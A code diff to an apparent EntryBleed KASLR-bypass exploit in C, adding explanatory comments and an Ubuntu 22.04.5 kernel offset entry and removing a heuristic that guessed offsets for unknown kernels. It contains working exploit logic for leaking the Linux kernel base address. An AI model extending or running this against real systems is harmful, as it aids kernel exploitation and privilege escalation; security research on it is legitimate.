@@ -49,8 +49,10 @@
 
 struct kernel_info {
   const char *kernel_version;
-  uint64_t entry_syscall_64;
-  uint64_t start_rodata;
+  uint64_t entry_syscall_64; /* page-aligned offset from kernel text base to
+                                entry_SYSCALL_64 (used when KPTI enabled) */
+  uint64_t start_rodata;     /* page-aligned offset from kernel text base to
+                                __start_rodata (used when KPTI disabled) */
 };
 
 // clang-format off
@@ -195,6 +197,9 @@ struct kernel_info offsets[] = {
     {"5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022",                              0xe00000, 0x1200000},
     {"5.15.0-56-lowlatency #62-Ubuntu SMP PREEMPT Wed Nov 23 09:50:07 UTC 2022",                   0xe00000, 0x1200000},
     {"5.15.0-57-generic #63-Ubuntu SMP Thu Nov 24 13:43:17 UTC 2022",                              0xe00000, 0x1200000},
+
+    // Ubuntu 22.04.5
+    {"6.8.0-87-generic #88~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Oct 14 14:03:14 UTC 2",          0x1400000, 0x1600000},
 
     // openSUSE Leap 15
     {"4.12.14-lp151.28.10-default #1 SMP Sat Jul 13 17:59:31 UTC 2019 (0ab03b7)",                  0x800000, 0xc00000},
@@ -383,43 +388,8 @@ unsigned long get_kernel_addr_entrybleed() {
 
   int kernel = detect_kernel_version();
 
-  if (kernel == -1) {
-    // For unknown kernels, try common offsets (most prevalent first).
-    // The offset is the distance from the kernel base to the scanned
-    // symbol and depends on the kernel build configuration and version.
-    static const uint64_t kpti_offsets[] = {0xe00000, 0xc00000, 0xa00000};
-    static const uint64_t nokpti_offsets[] = {0x1200000, 0x1000000, 0xe00000,
-                                              0xc00000};
-    const uint64_t *candidates = pti ? kpti_offsets : nokpti_offsets;
-    int ncandidates = pti ? 3 : 4;
-    int j, k, ok;
-
-    printf("[.] trying common offsets for unknown kernel ...\n");
-
-    for (j = 0; j < ncandidates; j++) {
-      uint64_t offset = candidates[j];
-      unsigned long addr = leak_syscall_entry(offset);
-      if (addr < KERNEL_BASE_MIN || addr > KERNEL_BASE_MAX)
-        continue;
-
-      ok = 1;
-      for (k = 0; k < 3; k++) {
-        if (addr != leak_syscall_entry(offset)) {
-          ok = 0;
-          break;
-        }
-      }
-
-      if (ok) {
-        printf("[.] heuristic %s offset 0x%lx\n",
-               pti ? "entry_SYSCALL_64" : "__start_rodata",
-               (unsigned long)offset);
-        return addr;
-      }
-    }
-
+  if (kernel == -1)
     return 0;
-  }
 
   uint64_t offset = offsets[kernel].start_rodata;
   if (pti)
